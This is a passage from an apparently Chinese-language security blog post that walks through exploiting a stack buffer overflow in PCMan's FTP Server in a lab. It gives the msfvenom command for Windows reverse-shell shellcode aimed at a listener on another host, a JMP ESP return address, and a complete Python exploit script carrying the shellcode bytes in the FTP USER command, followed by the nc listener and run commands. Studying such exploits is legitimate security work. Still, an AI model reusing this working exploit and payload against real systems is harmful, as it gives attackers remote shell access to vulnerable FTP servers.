+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140901583.png" alt="image-20201116140901583"></p>
+<p>这里我们选择<code>kernel32.dll</code> 进行搜索， 搜索JMP ESP命令</p>
+<p><code>右键-&gt; Search for -&gt; Command -&gt; 输出jmp esp 搜索</code></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116141504015.png" alt="image-20201116141504015"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116141557567.png" alt="image-20201116141557567"></p>
+<p>这里返回的内存地址为<code>0x7C86467B</code>, 这个地址没有坏字符，我们可以来利用（坏字符是会破坏我们漏洞的字符，如<code>0x00</code>）,因为这里我们是小端显示，所以构造shellcode的时候需要倒过来写！</p>
+<h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">172.16</span><span class="number">.10</span><span class="number">.143</span> LPORT=<span class="number">1234</span> EXITFUNC=thread -f python -b <span class="string">&quot;\x00\x0a\x0d&quot;</span> -a x86</span><br><span class="line"><span class="comment"># 0x0A表示回车，0x0D表示换行，0x00表示字符串的结束， 这些都是坏字符，会破环我们的payload</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116142804801.png" alt="image-20201116142804801"></p>
+<p>我们在最后跳转地址加入若干NOP字符，NOP代表跳过，意味着什么都不需要操作，并且指示CPI跳过此指令。有时候可以通过在shellcode前填充NOP增加漏洞利用程序和shellcode可靠性。这里我添加30个NOP，以提高可靠性。最终exp程序为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: exp.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xdb\xd5\xbd\x8c\x36\xb0\x37\xd9\x74\x24\xf4\x58\x2b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc9\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xe4\x25\x52&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc2\x08\xa1\x10\x2d\xf0\x32\x75\xa7\x15\x03\xb5\xd3&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x5e\x34\x05\x97\x32\xb9\xee\xf5\xa6\x4a\x82\xd1\xc9&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xfb\x29\x04\xe4\xfc\x02\x74\x67\x7f\x59\xa9\x47\xbe&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x92\xbc\x86\x87\xcf\x4d\xda\x50\x9b\xe0\xca\xd5\xd1&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x38\x61\xa5\xf4\x38\x96\x7e\xf6\x69\x09\xf4\xa1\xa9&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa8\xd9\xd9\xe3\xb2\x3e\xe7\xba\x49\xf4\x93\x3c\x9b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc4\x5c\x92\xe2\xe8\xae\xea\x23\xce\x50\x99\x5d\x2c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xec\x9a\x9a\x4e\x2a\x2e\x38\xe8\xb9\x88\xe4\x08\x6d&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4e\x6f\x06\xda\x04\x37\x0b\xdd\xc9\x4c\x37\x56\xec&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x82\xb1\x2c\xcb\x06\x99\xf7\x72\x1f\x47\x59\x8a\x7f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x28\x06\x2e\xf4\xc5\x53\x43\x57\x82\x90\x6e\x67\x52&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xbf\xf9\x14\x60\x60\x52\xb2\xc8\xe9\x7c\x45\x2e\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x39\xd9\xd1\xeb\x39\xf0\x15\xbf\x69\x6a\xbf\xc0\xe1&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6a\x40\x15\xa5\x3a\xee\xc6\x06\xea\x4e\xb7\xee\xe0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x40\xe8\x0f\x0b\x8b\x81\xba\xf6\x5c\x02\x2a\xf2\x13&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x32\x49\x02\x28\x11\xc4\xe4\x5a\x85\x81\xbf\xf2\x3c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x88\x4b\x62\xc0\x06\x36\xa4\x4a\xa5\xc7\x6b\xbb\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xdb\x1c\x4b\x9f\x81\x8b\x54\x35\xad\x50\xc6\xd2\x2d&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x1e\xfb\x4c\x7a\x77\xcd\x84\xee\x65\x74\x3f\x0c\x74&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xe0\x78\x94\xa3\xd1\x87\x15\x21\x6d\xac\x05\xff\x6e&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xe8\x71\xaf\x38\xa6\x2f\x09\x93\x08\x99\xc3\x48\xc3&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4d\x95\xa2\xd4\x0b\x9a\xee\xa2\xf3\x2b\x47\xf3\x0c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x83\x0f\xf3\x75\xf9\xaf\xfc\xac\xb9\xd0\x1e\x64\xb4&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x78\x87\xed\x75\xe5\x38\xd8\xba\x10\xbb\xe8\x42\xe7&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa3\x99\x47\xa3\x63\x72\x3a\xbc\x01\x74\xe9\xbd\x03&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">2001</span> + <span class="string">&quot;\x7b\x46\x86\x7c&quot;</span> + <span class="string">&quot;\x90&quot;</span> * <span class="number">30</span> + buf</span><br><span class="line">host = sys.argv[<span class="number">1</span>] 	<span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])	<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
+
+<p>kali2.0 使用<code>nc -lp 1234</code> 监听1234端口，然后执行<code>./exp.py 172.16.10.156 21</code> </p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116143051811.png" alt="image-20201116143051811"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116143136212.png" alt="image-20201116143136212"></p>
+<blockquote>
+<p>参考文章：<a target="_blank" rel="noopener" href="http://www.legendsec.org/2020.html%EF%BC%8C">http://www.legendsec.org/2020.html，</a> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/84893">https://www.anquanke.com/post/id/84893</a></p>
+</blockquote>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Bobtaoy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://www.ywboy.cn/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">http://www.ywboy.cn/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/">溢出攻击</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/11/03/upload-labs%E7%AC%94%E8%AE%B0/"><img class="next-cover" src="https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">upload-labs笔记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2020/10/06/shellcode编写-三/" title="shellcode编写(三)"><img class="cover" src="https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-06</div><div class="title">shellcode编写(三)</div></div></a></div><div><a href="/2020/10/06/缓冲区溢出原理分析-一/" title="缓冲区溢出原理分析(一)"><img class="cover" src="https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-06</div><div class="title">缓冲区溢出原理分析(一)</div></div></a></div><div><a href="/2020/10/06/缓冲区溢出的利用-二/" title="缓冲区溢出的利用(二)"><img class="cover" src="https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-06</div><div class="title">缓冲区溢出的利用(二)</div></div></a></div></div></div></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By Bobtaoy</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Just trust yourself, then you will know how to live.</div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script></div></body></html>
